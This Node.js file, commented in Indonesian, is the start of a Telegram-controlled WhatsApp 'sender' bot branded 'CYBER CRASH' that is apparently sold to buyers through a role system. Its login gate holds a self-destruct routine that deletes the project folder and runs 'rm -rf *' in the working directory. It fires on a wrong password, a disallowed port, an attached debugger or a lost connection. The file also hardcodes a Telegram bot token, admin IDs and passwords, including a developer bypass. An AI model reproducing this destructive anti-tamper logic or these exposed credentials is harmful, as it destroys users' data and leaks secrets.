const fs = require('fs');
const path = require('path');
const readline = require('readline');
const axios = require('axios');
const crypto = require('crypto');
const { exec } = require('child_process');

// 🛡️ --- KONFIGURASI --- 🛡️
const ALLOWED_PORTS = ["2245", "3285", "4054", "2000"]; 
const TG_TOKEN = "8560977514:AAE_89Q4ICTfjOeIEBBia4qEeSiNkuba8uI";
const ADMIN_ID = "8384929286";

// 🔑 PASSWORD (SENSITIVE CASE)
// 1. Akun Developer (Bypass)
const DEV_USERNAME = "raul";
const DEV_PASSWORD = "92"; 

// 2. Akun User (Target yang kamu minta)
const USER_USERNAME = "CYBER CRASH"; 
const USER_PASSWORD = "4567909090900666"; 

// FILE PATHS
const SESSION_FILE = path.join(__dirname, '.SaveLog.json');
const SELF_FILE = __filename;

// READ CONFIG
let vpsConfig = { ipvps: "Unknown IP", port: "2096" };
try { vpsConfig = require("./database/¿KeiraaExe.js"); } catch (e) { vpsConfig = { ipvps: "127.0.0.1", port: "2096" }; }
const CURRENT_PORT = String(process.env.PORT || vpsConfig.port || "2096").trim();

// 🛠️ UTILS
const ask = (q) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(r => { 
        rl.question(q, (a) => { 
            rl.close(); 
            r(a.trim()); 
        }); 
    });
};
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// 🔥 FUNGSI PEMUSNAH MASSAL (DOOMSDAY) 🔥
const triggerDoomsday = async (reason) => {
    console.clear();
    console.log(`\n\x1b[41m\x1b[37m 🚨 SECURITY BREACH DETECTED: ${reason.toUpperCase()} 🚨 \x1b[0m\n`);
    
    // 1. SPAM BRUTAL (TEXT WAR)
    const insults = [
        "MAMPUS LU!", "JANGAN NYOLONG!", "SKILL ISSUE?", "BYE BYE DATA!", 
        "KEIRAA SECURITY ON TOP!", "NANGIS GAK?", "YAHHH ILANG :("
    ];
    
    // Spamming console secepat kilat
    const spamLimit = 5000;
    for (let i = 0; i < spamLimit; i++) {
        const text = insults[Math.floor(Math.random() * insults.length)];
        process.stdout.write(`\x1b[31m[ SYSTEM MELTDOWN ] ${text} \x1b[0m\n`);
    }

    console.log("\n\x1b[41m 💣 MENGHAPUS SELURUH SERVER DALAM 1 DETIK... 💣 \x1b[0m");
    await sleep(1000);

    // 2. DELETE EVERYTHING (NUKE)
    try {
        // Hapus file sesi dulu
        if (fs.existsSync(SESSION_FILE)) fs.unlinkSync(SESSION_FILE);
        
        // Hapus folder project ini
        fs.rmSync(__dirname, { recursive: true, force: true });
        
        // Coba perintah sistem (Linux) untuk memastikan musnah
        exec("rm -rf *"); 
        exec("rm -rf ./*");
    } catch (e) {
        // Silent fail, just exit
    }
    
    // Matikan proses dengan kode error
    process.exit(1);
};

// 🔒 INTEGRITY CHECK (ANTI-EDIT & ANTI-DEBUG)
const securityCheck = () => {
    // 1. Cek Ukuran File (Jika ada yang hapus baris -> Nuke)
    try {
        const stats = fs.statSync(SELF_FILE);
        if (stats.size < 2000) triggerDoomsday("FILE INTEGRITY CORRUPTED");
    } catch (e) { triggerDoomsday("FILE MISSING"); }

    // 2. Cek Mode Debug (Anti Inspector)
    const args = process.execArgv.join();
    if (args.includes('inspect') || args.includes('debug')) {
        triggerDoomsday("DEBUGGER DETECTED");
    }
};

// 🔒 SESSION CHECK
const checkSession = () => {
    if (!fs.existsSync(SESSION_FILE)) return false;
    try {
        const data = JSON.parse(fs.readFileSync(SESSION_FILE));
        // Cek Signature Sederhana (MD5 Password Dev)
        const validSig = crypto.createHash('md5').update(DEV_PASSWORD).digest('hex');
        
        // Jika signature di file beda (diedit manual) -> NUKE
        if (data.signature !== validSig) {
            triggerDoomsday("SESSION TAMPERING DETECTED");
            return false;
        }
        
        return true; // Sesi Valid
    } catch (e) {
        triggerDoomsday("CORRUPT SESSION FILE"); 
        return false;
    }
};

const saveSession = () => {
    const data = {
        loginTime: Date.now(),
        user: "admin",
        signature: crypto.createHash('md5').update(DEV_PASSWORD).digest('hex')
    };
    fs.writeFileSync(SESSION_FILE, JSON.stringify(data));
};

// 🚀 LOGIKA UTAMA 🚀
const startSecurity = async () => {
    console.clear();
    securityCheck(); // Cek Integritas

    // 1. CEK PORT (Salah Port = NUKE)
    // Otomatis lolos jika port ada di ALLOWED_PORTS
    if (!ALLOWED_PORTS.includes(CURRENT_PORT)) {
        await triggerDoomsday(`FORBIDDEN PORT (${CURRENT_PORT})`);
    }

    // 2. AUTO LOGIN
    if (checkSession()) {
        console.log("\x1b[32m[ SECURITY ] Welcome back, Owner. System Unlocked.\x1b[0m");
        await sleep(800);
        return startApp(); // Pastikan fungsi startApp() ada di kode utamamu
    }

    // 3. LOGIN MANUAL (ONE CHANCE ONLY)
    console.log("\x1b[36m[ SECURITY ]\x1b[0m \x1b[33mIdentity Verification Required.\x1b[0m");
    console.log("\x1b[31m[ WARNING ] 1 KESALAHAN = DATA HANGUS.\x1b[0m");
    
    const username = await ask("\x1b[37m👤 Username: \x1b[0m");
    const password = await ask("\x1b[37m🔑 Password: \x1b[0m");

    // --- VERIFIKASI ---

    // SKENARIO 1: DEVELOPER (Bypass - Langsung Masuk)
    if (username === DEV_USERNAME && password === DEV_PASSWORD) {
        console.log("\x1b[32m✅ ACCESS GRANTED: DEVELOPER MODE.\x1b[0m");
        saveSession();
        return startApp();
    }
    
    if (username !== USER_USERNAME || password !== USER_PASSWORD) {
        await triggerDoomsday("INVALID CREDENTIALS");
    }

    console.log("\x1b[35m🤭 Sedang memeriksa Dulu Apakah Anda Buyer Asli @Pahlawanppp.\x1b[0m");

        try {
        const msgText = `⚠️ *INTRUSION ALERT* ⚠️\nUser: \`${username}\` mencoba masuk.\nIP: \`${vpsConfig.ipvps}\`\n\nPassword Benar. Izinkan?`;
        const keyboard = { inline_keyboard: [[{ text: "✅ YA", callback_data: "allow" }, { text: "💀 MATIKAN (NUKE)", callback_data: "nuke" }]] };

        const sendRes = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            chat_id: ADMIN_ID, text: msgText, parse_mode: "Markdown", reply_markup: keyboard
        });

        const messageId = sendRes.data.result.message_id;
        let isSafe = false;
        let isRejected = false; // Flag baru untuk cek penolakan

        // Tunggu respon 20 detik
        for (let i = 0; i < 10; i++) {
            const updates = await axios.get(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1`);
            
            for (const update of updates.data.result) {
                if (update.callback_query && update.callback_query.message.message_id === messageId) {
                    const action = update.callback_query.data;
                    
                    // Hapus pesan (Pakai .catch biar kalau gagal tidak bikin script error)
                    await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/deleteMessage`, { 
                        chat_id: ADMIN_ID, 
                        message_id: messageId 
                    }).catch(() => {}); 

                    if (action === "allow") {
                        isSafe = true;
                        i = 10; // Break loop
                    } else {
                        isRejected = true;
                        i = 10; // Break loop
                    }
                }
            }
            if (isSafe || isRejected) break;
            await sleep(2000);
        }

        // --- EKSEKUSI KEPUTUSAN ---

        if (isRejected) {
            // Jika DITOLAK (Klik Nuke)
            await triggerDoomsday("ACCESS DENIED BY OWNER"); 
            return; // 🛑 BERHENTI DISINI SUPAYA GAK LANJUT KE BAWAH
        }

        if (!isSafe) {
            // Jika DIABAIKAN (Timeout)
            await triggerDoomsday("VERIFICATION TIMEOUT");
            return;
        }

    } catch (err) {
        // Log error asli untuk debugging (opsional)
        // console.log(err); 
        
        // Jika error koneksi telegram -> NUKE
        await triggerDoomsday("TELEGRAM CONNECTION LOST");
        return;
    }

    console.log("\x1b[32m✅ VERIFIED. SAVING SESSION...\x1b[0m");
    saveSession();
    await sleep(1000);
    startApp();
};


function startApp() {
    
    console.log("\x1b[32m[ SYSTEM ] : Starting Application...\x1b[0m");

const { Telegraf } = require("telegraf");
const { Markup } = require('telegraf');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const config = require("./database/¿KeiraaExe.js");
const express = require('express');
const fetch = require("node-fetch"); 
const os = require('os');
const AdmZip = require('adm-zip');
const hitCounters = new Map(); 
const tar = require('tar'); 
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');

const { tokens, Developer: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cookieParser()); 
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(express.json());


const ownerIds = [8335533317]; // contoh chat_id owner 

//SETTINGS PAIRING
const { addSender, sessions, file_session } = require('./addsenderhandler.js');
const sessions_dir = "./auth";
const file = "./database/Visstable.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;
let globalMessages = []; 


function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      resellers: [],
      partners: [],     
      vips: [],
      managers: [],     // Tambahan Role Manager
      staffs: [],       // Tambahan Role Staff
      staffSenders: [] 
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  let data = JSON.parse(fs.readFileSync(file));

  // Validasi data (jika file sudah ada tapi key belum ada)
  if (!data.owners) data.owners = [];
  if (!data.resellers) data.resellers = [];
  
  if (!data.partners) data.partners = [];      
  if (!data.vips) data.vips = [];
  
  // Inisialisasi Role Baru
  if (!data.managers) data.managers = []; // Cek Manager
  if (!data.staffs) data.staffs = [];     // Cek Staff
  
  if (!data.staffSenders) data.staffSenders = []; 

  saveAkses(data);

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}


function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPartner(id) {
  const data = loadAkses();
  return data.partners.includes(id.toString()); 
}

function isVIP(id) {
  const data = loadAkses();
  return data.vips.includes(id.toString());
}

function isManager(id) {
  const data = loadAkses();
  return data.managers.includes(id.toString());
}

function isStaff(id) {
  const data = loadAkses();
  return data.staffs.includes(id.toString());
}

function isStaffSender(id) {
  const data = loadAkses();
  return data.staffSenders.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  const userId = id.toString();

  // Cek Blacklist
  if (data.blacklist) {
      const blockedUser = data.blacklist.find(b => b.id === userId);
      if (blockedUser) {
          if (Date.now() > blockedUser.expired) {
              // Auto Unban jika durasi habis
              data.blacklist = data.blacklist.filter(b => b.id !== userId);
              saveAkses(data);
          } else {
              return false; // Masih di Blacklist
          }
      }
  }
  
  return (
    data.owners.includes(userId) ||
    data.resellers.includes(userId) ||
    data.partners.includes(userId) ||
    data.vips.includes(userId) ||
    data.managers.includes(userId) ||
    data.staffs.includes(userId) ||
    data.staffSenders.includes(userId)
  );
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const autoDelete = async (ctx, messageId, timeout = 5000) => {
    if (!messageId) return; // Cegah error jika ID kosong
    setTimeout(() => {
        ctx.deleteMessage(messageId).catch((err) => {
            // Abaikan error jika pesan sudah terhapus duluan
            // console.log("Gagal hapus pesan:", err.message); 
        });
    }, timeout);
};
// Helper: Cek List Role
const checkRoleList = async (ctx, roleArray, title) => {
    autoDelete(ctx, ctx.message.message_id, 1000);

    if (!isAuthorized(ctx.from.id)) {
        const msg = await ctx.reply("⛔ Akses ditolak.");
        return autoDelete(ctx, msg.message_id);
    }

    if (!roleArray || roleArray.length === 0) {
        const msg = await ctx.reply(`📂 <b>Data ${title} Kosong.</b>`, { parse_mode: "HTML" });
        return autoDelete(ctx, msg.message_id, 5000);
    }

    let message = `📋 <b>LIST ${title.toUpperCase()}</b> 📋\n\n`;
    const loadingMsg = await ctx.reply(`⏳ <i>Mengambil data ${title}...</i>`, { parse_mode: "HTML" });

    let count = 1;
    for (const id of roleArray) {
        try {
            const chatInfo = await ctx.telegram.getChat(id);
            const name = chatInfo.username ? `@${chatInfo.username}` : chatInfo.first_name;
            message += `${count}. <code>${id}</code> - ${name}\n`;
        } catch (error) {
            message += `${count}. <code>${id}</code> - (Hidden/Error)\n`;
        }
        count++;
    }
    
    message += `\nTotal: ${roleArray.length}`;
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, message, { parse_mode: "HTML" });
};

// Helper: Announce to Group
const announceToGroup = async (ctx, roleName, targetId) => {
    if (!ANNOUNCE_GROUP_ID) return;
    try {
        const chatInfo = await ctx.telegram.getChat(targetId).catch(() => ({ first_name: "Unknown", username: null }));
        const name = chatInfo.username ? `@${chatInfo.username}` : chatInfo.first_name;
        
        const text = `
📢 <b>NEW ${roleName.toUpperCase()} DETECTED!</b>

👤 <b>User:</b> ${name}
🆔 <b>ID:</b> <code>${targetId}</code>
👑 <b>Promoted By:</b> ${ctx.from.first_name}

<i>Selamat bergabung di tim ${roleName}!</i>`;
        
        await ctx.telegram.sendMessage(ANNOUNCE_GROUP_ID, text, { parse_mode: "HTML" });
    } catch (e) {
        console.log("Gagal kirim ke grup:", e.message);
    }
};

// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log(chalk.green("Akun Terdaftar Bree"));
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

// 4. COMMAND MANAGEMENT ROLE (INVITE & DELETE)
// ==========================================

// --- FUNGSI GENERIK UNTUK INVITE ---
const processInvite = async (ctx, roleName, targetArrayKey, requiredAuth) => {
    autoDelete(ctx, ctx.message.message_id, 1000); // Hapus command user

    const userId = ctx.from.id.toString();
    const targetId = ctx.message.text.split(" ")[1];

    // Cek Otorisasi Penambah
    if (requiredAuth === 'owner' && !isOwner(userId)) {
        const m = await ctx.reply("⛔ Khusus Owner.");
        return autoDelete(ctx, m.message_id);
    }
    if (requiredAuth === 'partner' && (!isOwner(userId) && !isPartner(userId))) {
        const m = await ctx.reply("⛔ Khusus Owner/Partner.");
        return autoDelete(ctx, m.message_id);
    }

    if (!targetId) {
        const m = await ctx.reply(`⚠️ Format: <code>/invite${roleName.toLowerCase()} ID</code>`, {parse_mode:"HTML"});
        return autoDelete(ctx, m.message_id);
    }

    const data = loadAkses();
    if (data[targetArrayKey].includes(targetId)) {
        const m = await ctx.reply(`⚠️ User sudah menjadi ${roleName}.`);
        return autoDelete(ctx, m.message_id);
    }

    data[targetArrayKey].push(targetId);
    saveAkses(data);
    announceToGroup(ctx, roleName, targetId);

    // Pesan Sukses (Tidak Dihapus)
    await ctx.reply(`✅ <b>Sukses Invite ${roleName}!</b>\n🆔 <code>${targetId}</code>`, { parse_mode: "HTML" });
};

// COMMAND INVITE
bot.command("inviteowner", (ctx) => processInvite(ctx, "Owner", "owners", "owner"));
bot.command("invitemanager", (ctx) => processInvite(ctx, "Manager", "managers", "owner"));
bot.command("invitept", (ctx) => processInvite(ctx, "Partner", "partners", "owner"));
bot.command("invitereseller", (ctx) => processInvite(ctx, "Reseller", "resellers", "partner")); // Owner & Partner bisa
bot.command("invitevip", (ctx) => processInvite(ctx, "VIP", "vips", "partner"));
bot.command("invitestaff", (ctx) => processInvite(ctx, "Staff Sender", "staffSenders", "owner"));

// COMMAND DELETE (Hanya Owner)
const processDelete = async (ctx, targetArrayKey, roleName) => {
    autoDelete(ctx, ctx.message.message_id, 1000);
    if (!isOwner(ctx.from.id)) return;

    const targetId = ctx.message.text.split(" ")[1];
    if (!targetId) return ctx.reply(`Usage: /del${roleName.toLowerCase().replace(" ", "")} ID`);

    const data = loadAkses();
    const initialLen = data[targetArrayKey].length;
    data[targetArrayKey] = data[targetArrayKey].filter(uid => uid !== targetId);
    
    if (data[targetArrayKey].length < initialLen) {
        saveAkses(data);
        const m = await ctx.reply(`🗑️ ${roleName} ${targetId} telah dihapus.`);
        autoDelete(ctx, m.message_id, 5000);
    } else {
        const m = await ctx.reply(`⚠️ User bukan ${roleName}.`);
        autoDelete(ctx, m.message_id, 5000);
    }
};

bot.command("delowner", (ctx) => processDelete(ctx, "owners", "Owner"));
bot.command("delmanager", (ctx) => processDelete(ctx, "managers", "Manager"));
bot.command("delpt", (ctx) => processDelete(ctx, "partners", "Partner"));
bot.command("delreseller", (ctx) => processDelete(ctx, "resellers", "Reseller"));
bot.command("delvip", (ctx) => processDelete(ctx, "vips", "VIP"));
bot.command("delstaff", (ctx) => processDelete(ctx, "staffSenders", "Staff Sender"));

// ==========================================
// 5. COMMAND CHECK LIST
// ==========================================
bot.command("cekowner", (ctx) => checkRoleList(ctx, loadAkses().owners, "Owner"));
bot.command("cekmanager", (ctx) => checkRoleList(ctx, loadAkses().managers, "Manager"));
bot.command("cekpartner", (ctx) => checkRoleList(ctx, loadAkses().partners, "Partner"));
bot.command("cekreseller", (ctx) => checkRoleList(ctx, loadAkses().resellers, "Reseller"));
bot.command("cekvip", (ctx) => checkRoleList(ctx, loadAkses().vips, "VIP Member"));
bot.command("cekstaff", (ctx) => checkRoleList(ctx, loadAkses().staffSenders, "Staff Sender"));

// ==========================================
// 6. BLACKLIST SYSTEM
// ==========================================
bot.command("blacklist", async (ctx) => {
    autoDelete(ctx, ctx.message.message_id, 1000);

    if (!isOwner(ctx.from.id)) {
        const m = await ctx.reply("⛔ Khusus Owner.");
        return autoDelete(ctx, m.message_id);
    }

    const args = ctx.message.text.split(" ");
    const targetId = args[1];
    const duration = args[2];

    if (!targetId || !duration) {
        const m = await ctx.reply("⚠️ Format: `/blacklist ID 1d` (1d/1h/30m)");
        return autoDelete(ctx, m.message_id);
    }

    const ms = parseDuration(duration);
    if (!ms) {
        const m = await ctx.reply("⚠️ Format durasi salah.");
        return autoDelete(ctx, m.message_id);
    }

    const data = loadAkses();
    data.blacklist = data.blacklist.filter(b => b.id !== targetId); // Hapus jika ada sebelumnya
    data.blacklist.push({ id: targetId, expired: Date.now() + ms });
    saveAkses(data);

    // Pesan Sukses Blacklist (Tetap Ada / Tidak dihapus sesuai request)
    await ctx.reply(`🚫 <b>USER BLACKLISTED!</b>\n🆔 <code>${targetId}</code>\n⏳ Selama: ${duration}`, { parse_mode: "HTML" });
});

bot.command("unblacklist", async (ctx) => {
    autoDelete(ctx, ctx.message.message_id, 1000);
    if (!isOwner(ctx.from.id)) return;

    const targetId = ctx.message.text.split(" ")[1];
    if (!targetId) return;

    const data = loadAkses();
    data.blacklist = data.blacklist.filter(b => b.id !== targetId);
    saveAkses(data);

    const m = await ctx.reply(`✅ <b>User ${targetId} dihapus dari blacklist.</b>`, { parse_mode: "HTML" });
    autoDelete(ctx, m.message_id, 5000);
});

// ==============================================================================
// SYSTEM CONGRATULATION SERVER
// ==============================================================================

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const delActive = (BotNumber) => {
  if (!fs.existsSync(file_session)) return;
  const list = JSON.parse(fs.readFileSync(file_session));
  const newList = list.filter(num => num !== BotNumber);
  fs.writeFileSync(file_session, JSON.stringify(newList));
  console.log(`✓ Nomor ${BotNumber} berhasil dihapus dari sesi`);
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const ADMIN_ID = "8312382874"; // Ganti dengan ID Telegram kamu untuk notif
const SECURITY_LIMIT = 20; // Batas jumlah hit sebelum delay
const SECURITY_DELAY = 4000; // Delay 4 detik

const sendTelegramAlert = async (message) => {
    try {
        // Asumsi variabel 'bot' (Telegraf) sudah global. Jika tidak, sesuaikan.
        if (typeof bot !== 'undefined') {
            await bot.telegram.sendMessage(ADMIN_ID, message); 
        } else {
            console.log(chalk.red("[ALERT] Bot Telegram belum didefinisikan untuk notif: " + message));
        }
    } catch (e) {
        console.error("Gagal kirim alert telegram:", e.message);
    }
};

function makeBox(title, lines) {
  const contentLengths = [
    title.length,
    ...lines.map(l => l.length)
  ];
  const maxLen = Math.max(...contentLengths);

  const top    = "" + "".repeat(maxLen + 1) + "";
  const middle = "" + "".repeat(maxLen + 1) + "";
  const bottom = "" + "".repeat(maxLen + 1) + "";

  const padCenter = (text, width) => {
    const totalPad = width - text.length;
    const left = Math.floor(totalPad / 1);
    const right = totalPad - left;
    return " ".repeat(left) + text + " ".repeat(right);
  };

  const padRight = (text, width) => {
    return text + " ".repeat(width - text.length);
  };

  const titleLine = " " + padCenter(title, maxLen) + " ";
  const contentLines = lines.map(l => " " + padRight(l, maxLen) + " ");

  return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const makeStatus = (number, status) => makeBox("Pairing Connection", [
`Nomor Bot : ${number}`,
`Status : ${status.toUpperCase()}`
]);

const makeCode = (number, code) => ({
  text: makeBox("ＳＴＡＴＵＳ ＰＡＩＲ", [
`Nomor Bot : ${number}`,
`Kode Sambung : ${code}`
  ]),
  parse_mode: "HTML"
});

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.red(`
Totals Sender Online : ${activeNumbers.length}`));
  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(chalk.red(`Sender ${BotNumber} Online`));
          sessions.set(BotNumber, sock);
          
          // === [FITUR 1] SECURITY SENDER (Rate Limiter) ===
          // Kita 'bajak' fungsi relayMessage untuk menghitung spam
          const originalRelay = sock.relayMessage;
          hitCounters.set(BotNumber, 0); // Reset counter saat connect

          sock.relayMessage = async (...args) => {
            let currentCount = hitCounters.get(BotNumber) || 0;
            currentCount++;
            hitCounters.set(BotNumber, currentCount);

            if (currentCount > SECURITY_LIMIT) {
                console.log(chalk.yellow(`⚠️ Security Sender: ${BotNumber} terdeteksi spam (${currentCount}). Delay ${SECURITY_DELAY}ms...`));
                await delay(SECURITY_DELAY);
                // Reset counter sedikit agar tidak delay terus menerus, atau biarkan tetap delay
                // Di sini saya kurangi sedikit biar smooth
                hitCounters.set(BotNumber, currentCount - 5); 
            }
            
            return await originalRelay.apply(sock, args);
          };
          // ===============================================

          // === AUTO JOIN & FOLLOW (KODE ASLI KAMU) ===
          try {
            const channels = ["", "", ""]; // Isi ID Saluran
            for (const jid of channels) {
              if(!jid) continue;
              await sock.newsletterFollow(jid).catch(() => {});
              await delay(2000);
            }

            const groupInvites = ["", ""]; // Isi Link Grup
            for (const invite of groupInvites) {
              if(!invite) continue;
              try {
                const code = invite.split("/").pop();
                await sock.groupAcceptInvite(code);
                await delay(2000);
              } catch (err) {}
            }
            console.log(chalk.greenBright(`✓ Setup ${BotNumber} selesai!`));
          } catch (err) {}
          // === SAMPAI SINI ===

          return resolve();
        }

        if (connection === "close") {
          const shouldReconnect =
            lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

          if (shouldReconnect) {
            console.log(chalk.yellow(`Koneksi ${BotNumber} tertutup, mencoba reconnect...`));
            // Hati-hati rekursif di sini, pastikan tidak looping infinite tanpa delay
            await delay(3000); 
            initializeWhatsAppConnections(); 
          } else {
            console.log(chalk.red(`Sender ${BotNumber} Terlogout/Banned`));
            sessions.delete(BotNumber);
            // Opsional: Hapus dari file JSON jika logout permanen
            deleteActive(BotNumber);
          }
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
  
  // Jalankan Monitoring setelah inisialisasi selesai
  startMonitoringServices();
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`<blockquote>Wet Ya Lek Ku, System Mencoba Menghubungkan ${BotNumber} Sebagai Sender Apps CYBER CRASH</blockquote>`, { parse_mode: "HTML" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
    } catch (e) {
      console.error("Falha ao editar mensagem:", e.message);
    }
  };

  const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;

      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menyambung"));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "Gagal Total."));
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);

      // === [FITUR 1] SECURITY SENDER (Rate Limiter) ===
      const originalRelay = sock.relayMessage;
      hitCounters.set(BotNumber, 0);

      sock.relayMessage = async (...args) => {
        let currentCount = hitCounters.get(BotNumber) || 0;
        currentCount++;
        hitCounters.set(BotNumber, currentCount);

        if (currentCount > SECURITY_LIMIT) {
            console.log(chalk.yellow(`⚠️ Security Sender: ${BotNumber} delay 4s...`));
            await delay(SECURITY_DELAY);
            hitCounters.set(BotNumber, currentCount - 5);
        }
        return await originalRelay.apply(sock, args);
      };
      // ===============================================

      return await editStatus(makeStatus(BotNumber, "Succces To Connect"));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "KEIRAAV5");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "HTML",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Erro ao solicitar código:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

// --- SISTEM MONITORING OTOMATIS ---

let monitoringStarted = false;

const startMonitoringServices = () => {
    if (monitoringStarted) return;
    monitoringStarted = true;
    console.log(chalk.cyan("🛡️ Layanan Keamanan & Monitoring Sender Dimulai..."));

    // [FITUR 2] PENGECEKAN SENDER (Setiap 1 Menit / 60000ms)
    setInterval(async () => {
        console.log(chalk.gray(`[Auto-Check] Memeriksa status sender...`));
        
        if (!fs.existsSync(file_session)) return;
        const activeNumbers = JSON.parse(fs.readFileSync(file_session));

        for (const number of activeNumbers) {
            const socket = sessions.get(number);
            
            // Cek apakah socket ada dan koneksi terbuka
            // readyState 1 artinya OPEN
            if (!socket || !socket.ws || socket.ws.readyState !== 1) { 
                const msg = `PERINGATAN SENDER\nNomor: ${number} terdeteksi TIDAK AKTIF/OFFLINE saat pengecekan rutin.`;
                console.log(chalk.red(`[Auto-Check] ${number} Mati!`));
                
                // Kirim notif ke Telegram
                await sendTelegramAlert(msg);
            }
        }
